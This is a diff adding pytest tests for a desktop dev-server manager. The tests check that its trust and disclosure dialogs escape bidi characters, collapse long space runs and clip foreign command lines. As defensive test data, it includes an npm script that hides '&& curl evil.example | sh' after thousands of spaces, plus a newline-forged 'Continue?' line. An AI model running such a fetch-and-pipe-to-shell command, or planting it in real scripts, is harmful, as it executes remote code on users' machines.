@@ -5939,6 +5939,190 @@ def test_a_layout_character_cannot_reach_the_trust_prompt(
     assert chr(codepoint) not in text
 
 
+@pytest.mark.parametrize(
+    "codepoint",
+    [0x202E, 0x2066, 0x2067, 0x2068, 0x2069, 0x2028],
+    ids=["RLO", "LRI", "RLI", "FSI", "PDI", "LINE-SEP"],
+)
+def test_a_bidi_control_in_an_npm_script_cannot_reach_the_trust_prompt(
+    qtbot, built, monkeypatch, codepoint
+) -> None:
+    """LWSM-1523 point 4: the scripts and `.npmrc` lines go through the same
+    escape as the three names, and the isolates U+2066..U+2069 are in the
+    escaped category as the overrides are. Locked, not changed."""
+    window, _ = window_for(qtbot, built, [record("a", 5005)], FakeProbe())
+
+    text = trust_text(
+        window,
+        monkeypatch,
+        Path("/srv/a"),
+        "npm",
+        ("npm", "run", "dev"),
+        (("dev", "vite" + chr(codepoint) + "x"),),
+    )
+
+    assert chr(codepoint) not in text
+    assert f"dev: vite\\u{codepoint:04x}x" in text
+
+
+def trust_prompt_width(window, monkeypatch, script: str) -> int:
+    """How wide the real message box lays one npm script line out."""
+    from PySide6.QtWidgets import QLabel, QMessageBox
+
+    seen: dict[str, QMessageBox] = {}
+
+    def capture(box: QMessageBox) -> QMessageBox.StandardButton:
+        seen["box"] = box
+        return QMessageBox.StandardButton.No
+
+    monkeypatch.setattr(QMessageBox, "exec", capture)
+    window._confirm_dialog(
+        Path("/srv/a"), "npm", ("npm", "run", "dev"), (("dev", script),)
+    )
+    box = seen["box"]
+    label = next(lab for lab in box.findChildren(QLabel) if lab.text() == box.text())
+    label.adjustSize()
+    return label.sizeHint().width()
+
+
+@pytest.mark.parametrize(
+    "space",
+    [" ", " ", " ", "　", "  "],
+    ids=["SPACE", "NO-BREAK-SPACE", "EM-SPACE", "IDEOGRAPHIC-SPACE", "ALTERNATING"],
+)
+def test_a_long_run_of_spaces_cannot_push_an_npm_script_out_of_the_prompt(
+    qtbot, built, monkeypatch, space
+) -> None:
+    """LWSM-1523 point 4: spaces are not a control character, so a script of
+    `vite`, three thousand spaces and `&& curl evil` laid the prompt out
+    thousands of pixels wide with the dangerous part off screen. A run is
+    shown as its length instead.
+
+    Asserted as a width against a control carrying the longest run left
+    as typed, so the runner's font cancels out.
+    """
+    window, _ = window_for(qtbot, built, [record("a", 5005)], FakeProbe())
+    tail = "&& curl evil.example | sh"
+
+    control = trust_prompt_width(window, monkeypatch, "vite" + " " * 8 + tail)
+    hostile = trust_prompt_width(window, monkeypatch, "vite" + space * 3000 + tail)
+    text = trust_text(
+        window,
+        monkeypatch,
+        Path("/srv/a"),
+        "npm",
+        ("npm", "run", "dev"),
+        (("dev", "vite" + space * 3000 + tail),),
+    )
+
+    assert hostile <= control * 1.5
+    assert tail in text
+    assert not re.search(r"\s{9}", text), "a run of blanks reached the prompt"
+
+
+def test_every_unicode_space_separator_is_in_the_run_guard() -> None:
+    """The guard names the space separators by hand, because enumerating the
+    category at import costs more than the list is worth; this is the check
+    that the list is the category."""
+    import unicodedata
+
+    from lwsm.mainwindow import _SPACE_SEPARATORS
+
+    expected = {
+        chr(code) for code in range(0x110000) if unicodedata.category(chr(code)) == "Zs"
+    }
+
+    assert set(_SPACE_SEPARATORS) == expected
+
+
+def test_a_short_run_of_spaces_is_shown_as_typed(qtbot, built, monkeypatch) -> None:
+    """The guard is for a run that lays the prompt out, not for the double
+    space a real command line has."""
+    window, _ = window_for(qtbot, built, [record("a", 5005)], FakeProbe())
+
+    text = trust_text(
+        window,
+        monkeypatch,
+        Path("/srv/a"),
+        "npm",
+        ("npm", "run", "dev"),
+        (("dev", "vite" + " " * 8 + "--open"),),
+    )
+
+    assert "dev: vite" + " " * 8 + "--open" in text
+
+
+def disclosure_command(window, monkeypatch, cmdline: str) -> str:
+    """The Command section of the disclosure box, as the box would show it."""
+    from PySide6.QtWidgets import QMessageBox
+
+    seen: dict[str, str] = {}
+
+    def capture(box: QMessageBox) -> QMessageBox.StandardButton:
+        seen["text"] = box.text()
+        return QMessageBox.StandardButton.No
+
+    monkeypatch.setattr(QMessageBox, "exec", capture)
+    window._disclose_dialog(
+        Path("/srv/a"), types.SimpleNamespace(pid=4242, cmdline=cmdline)
+    )
+    return seen["text"].split("Command:\n", 1)[1].split("\n\nStarted:", 1)[0]
+
+
+def test_a_long_holder_command_line_is_bounded_with_a_visible_ellipsis(
+    qtbot, built, monkeypatch
+) -> None:
+    """LWSM-1523 point 2: a foreign command line, up to the kernel's limit, went
+    into the box unclipped, so a hostile holder could push `Continue?` and the
+    buttons off screen. The bound is longer than a display name's, because the
+    arguments are what the user judges the process by."""
+    from lwsm.mainwindow import MAX_COMMAND_CHARS
+
+    window, _ = window_for(qtbot, built, [record("a", 5005)], FakeProbe())
+
+    shown = disclosure_command(window, monkeypatch, "node server.js " + "x" * 100_000)
+
+    assert len(shown) == MAX_COMMAND_CHARS
+    assert shown.endswith("…")
+    assert shown.startswith("node server.js x")
+
+
+def test_a_holder_command_line_of_ordinary_length_is_shown_whole(
+    qtbot, built, monkeypatch
+) -> None:
+    """The shared display-name clip is 120 characters, which would cut a real
+    `node` line before its last arguments. Dies on reusing it here."""
+    window, _ = window_for(qtbot, built, [record("a", 5005)], FakeProbe())
+    cmdline = "node /home/u/app/server.js " + " ".join(f"--opt{n}=v" for n in range(30))
+    assert 200 < len(cmdline) < 400
+
+    assert disclosure_command(window, monkeypatch, cmdline) == cmdline
+
+
+def test_a_holder_command_line_cannot_add_a_line_or_a_blank_run(
+    qtbot, built, monkeypatch
+) -> None:
+    """The escape the other fields get covers the command too, and the bound
+    counts what is SHOWN: a thousand newlines are escaped to two characters
+    each before the clip, not clipped as one character each."""
+    window, _ = window_for(qtbot, built, [record("a", 5005)], FakeProbe())
+
+    forged = disclosure_command(window, monkeypatch, "a\n\nContinue?\n" + "\n" * 1000)
+    blanks = disclosure_command(window, monkeypatch, "a" + " " * 5000 + "b")
+
+    assert "\n" not in forged
+    assert forged.startswith("a\\n\\nContinue?\\n")
+    assert blanks == "a\\s{5000}b"
+
+
+def test_an_absent_holder_command_line_reads_as_unknown(
+    qtbot, built, monkeypatch
+) -> None:
+    window, _ = window_for(qtbot, built, [record("a", 5005)], FakeProbe())
+
+    assert disclosure_command(window, monkeypatch, "") == "?"
+
+
 # --- LWSM-1148: exporting a profile, and merging one back in -----------------
 
 
@@ -10653,6 +10837,64 @@ def test_a_start_of_our_own_child_can_be_stopped_while_still_starting(qtbot) -> 
 
     row.update_from(dataclasses.replace(view, supervised=False))
     assert not row.stop_button.isEnabled(), "a start we hold no child for"
+
+
+def test_a_start_through_a_unit_can_be_stopped_while_still_starting(qtbot) -> None:
+    """LWSM-1527 point 4b: a unit active on another port reads `starting` with
+    no child of ours, and every button was off. Stop is the way out; the others
+    stay off, as for any start."""
+    from lwsm.controller import RowView
+
+    view = RowView(
+        path=Path("/srv/a"),
+        name="a",
+        effective_port=5005,
+        status=ProjectStatus.STARTING,
+        supervised=False,
+        service_start=True,
+    )
+    row = ProjectRow(view, Theme.default())
+    qtbot.addWidget(row)
+
+    assert row.stop_button.isEnabled()
+    assert not row.start_button.isEnabled()
+    assert not row.restart_button.isEnabled()
+    assert not row.open_button.isEnabled()
+
+    row.update_from(dataclasses.replace(view, service_start=False))
+    assert not row.stop_button.isEnabled(), "a start with no child and no unit"
+
+    row.update_from(
+        dataclasses.replace(view, status=ProjectStatus.STOPPING, service_start=True)
+    )
+    assert not row.stop_button.isEnabled(), "a second Stop while one is in flight"
+
+
+def test_enter_does_not_stop_a_start_through_a_unit(qtbot) -> None:
+    """Enter does nothing mid-start whoever started it; only a click on Stop
+    cancels."""
+    from lwsm.controller import RowView
+
+    row = ProjectRow(
+        RowView(
+            path=Path("/srv/a"),
+            name="a",
+            effective_port=5005,
+            status=ProjectStatus.STARTING,
+            service_start=True,
+        ),
+        Theme.default(),
+    )
+    qtbot.addWidget(row)
+    row.show()
+    stops: list[bool] = []
+    row.stop_button.clicked.connect(lambda: stops.append(True))
+    assert row.stop_button.isEnabled()
+
+    row.setFocus()
+    qtbot.keyClick(row, Qt.Key.Key_Return)
+
+    assert not stops
 
 
 def test_restart_is_not_offered_on_a_foreign_server(qtbot) -> None:
